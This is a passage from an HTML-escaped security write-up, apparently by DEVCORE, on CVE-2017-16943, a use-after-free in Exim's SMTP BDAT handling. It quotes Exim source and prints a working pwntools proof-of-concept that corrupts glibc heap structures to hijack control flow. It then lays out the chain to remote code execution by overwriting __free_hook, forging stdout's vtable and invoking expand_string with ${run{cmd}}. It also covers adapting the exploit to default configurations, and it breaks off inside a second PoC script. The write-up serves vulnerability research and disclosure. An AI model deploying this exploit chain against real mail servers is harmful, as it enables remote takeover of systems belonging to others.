class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;%u %n\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003echunking_datasize\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003esynprot_error\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eL_smtp_protocol_error\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e501\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nb\"\u003eNULL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"n\"\u003eUS\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;missing size for BDAT command\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eERR\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn exim, it usually calls \u003ccode\u003esynprot_error\u003c/code\u003e to raise error message, which also logs at the same time.\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FExim%2Fexim%2Fblob%2Fe924c08b7d031b712013a7a897e2d430b302fe6c%2Fsrc%2Fsrc%2Fsmtp_in.c%23L2984\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esmtp_in.c: 628 bdat_getc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e\n\u003cspan class=\"nf\"\u003esynprot_error\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003euschar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003euschar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eerrmess\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eyield\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003elog_write\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eLOG_MAIN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;SMTP %s error in \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e%s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e %s %s\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eL_smtp_syntax_error\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e?\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;syntax\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;protocol\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n  \u003cspan class=\"n\"\u003estring_printing\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esmtp_cmd_buffer\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003ehost_and_ident\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eTRUE\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eerrmess\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as \u003ccode\u003e\u0026#39;\\n\u0026#39;-\u0026gt;\u0026#39;\\\\n\u0026#39;\u003c/code\u003e. Therefore, it asks \u003ccode\u003estore_get\u003c/code\u003e for memory to store strings.\u003cbr\u003e\nThis store makes \u003ccode\u003eif (!store_extend(next-\u0026gt;text, oldsize, header_size))\u003c/code\u003e in \u003ccode\u003ereceive_msg\u003c/code\u003e failed when next extension occurs and then triggers use-after-free.\u003c/p\u003e\n\n\u003ch3 id=\"exploitation\"\u003eExploitation\u003c/h3\u003e\n\n\u003cp\u003eThe following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to \u003ccode\u003e0xdeadbeef\u003c/code\u003e. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when \u003cstrong\u003edkim\u003c/strong\u003e is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# CVE-2017-16943 PoC by meh at DEVCORE\n# pip install pwntools\n\u003c/span\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003epwn\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eremote\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;127.0.0.1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;EHLO test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvuntil\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;250 HELP\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;MAIL FROM:\u0026lt;meh@some.domain\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;RCPT TO:\u0026lt;meh@some.domain\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x1250\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\x7f\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvuntil\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;command\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;BDAT 1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;:BDAT \u003c/span\u003e\u003cspan class=\"se\"\u003e\\x7f\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003es\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ep64\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0xdeadbeef\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x1e00\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003es\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\r\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvuntil\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;command\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003einteractive\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eRunning out of \u003ccode\u003ecurrent_block\u003c/code\u003e\u003cbr\u003e\nIn order to achieve code execution, we need to make the \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e get the first store of a block. That is, running out of \u003ccode\u003ecurrent_block\u003c/code\u003e and making \u003ccode\u003estore_get\u003c/code\u003e allocate a new block. Therefore, we send a long message \u003ccode\u003e\u0026#39;a\u0026#39;*0x1250+\u0026#39;\\x7f\u0026#39;\u003c/code\u003e with an unprintable character to cut \u003ccode\u003ecurrent_block\u003c/code\u003e, making \u003ccode\u003eyield_length\u003c/code\u003e less than 0x100.\u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/PaQWaAT.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2FPaQWaAT.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/PaQWaAT.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eStarts BDAT data transfer\u003cbr\u003e\nAfter that, we send BDAT command to start data transfer. At the beginning, \u003ccode\u003enext\u003c/code\u003e and \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e are allocated by \u003ccode\u003estore_get\u003c/code\u003e. \u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/C9PPhPY.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2FC9PPhPY.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/C9PPhPY.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003cbr\u003e\nThe function \u003ccode\u003edkim_exim_verify_init\u003c/code\u003e is called sequentially and it also calls \u003ccode\u003estore_get\u003c/code\u003e. Notice that this function uses \u003cstrong\u003eANOTHER \u003ccode\u003estore_pool\u003c/code\u003e\u003c/strong\u003e, so it allocates from heap without changing \u003ccode\u003ecurrent_block\u003c/code\u003e which \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e also points to.\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FExim%2Fexim%2Fblob%2Fe924c08b7d031b712013a7a897e2d430b302fe6c%2Fsrc%2Fsrc%2Freceive.c%23L1734\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ereceive.c: 1734 receive_msg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight c\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esmtp_input\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003esmtp_batched_input\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003edkim_disable_verify\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003edkim_exim_verify_init\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003echunking_state\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"n\"\u003eCHUNKING_OFFERED\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCall \u003ccode\u003estore_getc\u003c/code\u003e inside \u003ccode\u003ebdat_getc\u003c/code\u003e\u003cbr\u003e\nThen, we send a BDAT command without SIZE. Exim complains about the incorrect command and cuts the \u003ccode\u003ecurrent_block\u003c/code\u003e with \u003ccode\u003estore_get\u003c/code\u003e in \u003ccode\u003estring_printing\u003c/code\u003e. \u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/5M1q0c4.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2F5M1q0c4.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/5M1q0c4.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eKeep sending msg until extension and bug triggered\u003cbr\u003e\nIn this way, while we keep sending huge messages, \u003ccode\u003ecurrent_block\u003c/code\u003e gets freed after the extension. In the malloc.c of glibc (so called ptmalloc), system manages a linked list of freed memory chunks, which is called unsortbin. Freed chunks are put into unsortbin if it is not the last chunk on the heap. In step 2, \u003ccode\u003edkim_exim_verify_init\u003c/code\u003e allocated chunks after \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e. Therefore, this chunk is put into unsortbin and the pointers of linked list are stored into the first 16 bytes of chunk (on x86-64). The location written is exactly \u003ccode\u003ecurrent_block-\u0026gt;next\u003c/code\u003e, and therefore \u003ccode\u003ecurrent_block-\u0026gt;next\u003c/code\u003e is overwritten to \u003ccode\u003eunsortbin\u003c/code\u003e inside \u003ccode\u003emain_arena\u003c/code\u003e of libc (linked list pointer \u003ccode\u003efd\u003c/code\u003e points back to \u003ccode\u003eunsortbin\u003c/code\u003e if no other freed chunk exists). \u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/xdGViKJ.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2FxdGViKJ.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/xdGViKJ.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eKeep sending msg for the next extension\u003cbr\u003e\nWhen the next extension occurs, \u003ccode\u003estore_get\u003c/code\u003e tries to cut from \u003ccode\u003emain_arena\u003c/code\u003e, which makes attackers able to overwrite all global variables below main_arena. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eOverwrite global variables in libc\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eFinish sending message and trigger \u003ccode\u003efree()\u003c/code\u003e\u003cbr\u003e\nIn the PoC, we simply modified \u003ccode\u003e__free_hook\u003c/code\u003e and ended the line. Exim calls \u003ccode\u003estore_reset\u003c/code\u003e to reset the buffer and calls \u003ccode\u003e__free_hook\u003c/code\u003e in \u003ccode\u003efree()\u003c/code\u003e. At this stage, we successfully controlled instruction pointer \u003ccode\u003e$rip\u003c/code\u003e.\u003cbr\u003e\nHowever, this is not enough for an RCE because the arguments are uncontrollable. As a result, we improved this PoC to modify both \u003ccode\u003e__free_hook\u003c/code\u003e and \u003ccode\u003e_IO_2_1_stdout_\u003c/code\u003e. We forged the vtable of \u003ccode\u003estdout\u003c/code\u003e and set \u003ccode\u003e__free_hook\u003c/code\u003e to any call of \u003ccode\u003efflush(stdout)\u003c/code\u003e inside exim. When the program calls fflush, it sets the first argument to stdout and jumps to a function pointer on the vtable of stdout. Hence, we can control both \u003ccode\u003e$rip\u003c/code\u003e and the content of first argument. \u003cbr\u003e\nWe consulted past CVE exploits and decided to call \u003ccode\u003eexpand_string\u003c/code\u003e, which executes command with \u003ccode\u003eexecv\u003c/code\u003e if we set the first argument to \u003ccode\u003e${run{cmd}}\u003c/code\u003e, and finally we got our RCE. \u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/2EkljvM.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2F2EkljvM.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/2EkljvM.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch4 id=\"exploit-for-default-configured-exim\"\u003eExploit for default configured exim\u003c/h4\u003e\n\n\u003cp\u003eWhen dkim is disabled, the PoC above fails because \u003ccode\u003ecurrent_block\u003c/code\u003e is the last chunk on heap. This makes the system merge it into a big chunk called \u003cstrong\u003etop chunk\u003c/strong\u003e rather than unsortbin.\u003cbr\u003e\nThe illustrations below describe the difference of heap layout:\u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/RQ9LVOb.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2FRQ9LVOb.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/RQ9LVOb.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/X29oSsT.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2FX29oSsT.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/X29oSsT.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eTo avoid this, we need to make exim allocate and free some memories before we actually start our exploitation. Therefore, we add some steps between step 1 and step 2.\u003c/p\u003e\n\n\u003cp\u003eAfter running out of \u003ccode\u003ecurrent_block\u003c/code\u003e:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eUse DATA command to send lots of data\nSend huge data, make the chunk big and extend many times. After several extension, it calls \u003ccode\u003estore_get\u003c/code\u003e to retrieve a bigger store and then releases the old one. This repeats many times if the data is long enough. Therefore, we have a big chunk in unsortbin.\u003c/li\u003e\n\u003cli\u003eEnd DATA transfer and start a new email\nRestart to send an email with BDAT command after the heap chunk is prepared.\u003c/li\u003e\n\u003cli\u003eAdjust \u003ccode\u003eyield_length\u003c/code\u003e again\nSend invalid command with an unprintable charater again to cut the \u003ccode\u003ecurrent_block\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eFinally the heap layout is like:\u003cbr\u003e\n![](\u003ca title=\"https://i.imgur.com/b4phS3c.png\" href=\"/redirect?url=https%3A%2F%2Fi.imgur.com%2Fb4phS3c.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://i.imgur.com/b4phS3c.png\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eAnd now we can go back to the step 2 at the beginning and create the same situation. When \u003ccode\u003enext-\u0026gt;text\u003c/code\u003e is freed, it goes back to unsortbin and we are able to overwrite libc global variables again.\u003cbr\u003e\nThe following is the PoC for default configured exim:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# CVE-2017-16943 PoC by meh at DEVCORE\n# pip install pwntools\n\u003c/span\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003epwn\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eremote\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;localhost\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;EHLO test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvuntil\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;250 HELP\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;MAIL FROM:\u0026lt;\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esendline\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;RCPT TO:\u0026lt;meh@some.domain\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003erecvline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan 